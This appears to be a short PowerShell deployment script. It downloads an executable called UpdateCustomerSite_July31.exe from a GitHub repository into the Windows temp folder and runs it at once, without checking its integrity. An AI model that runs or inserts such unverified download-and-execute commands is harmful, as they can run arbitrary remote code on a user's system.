$url = "https://github.com/murtaza7869/Deploy/raw/master/UpdateCustomerSite_July31.exe"
$output = "C:\Windows\temp\UpdateCustomerSite_July31.exe"
$wc = new-object System.Net.WebClient
$wc.DownloadFile($url, $output)
Start-Process -FilePath "C:\Windows\temp\UpdateCustomerSite_July31.exe"
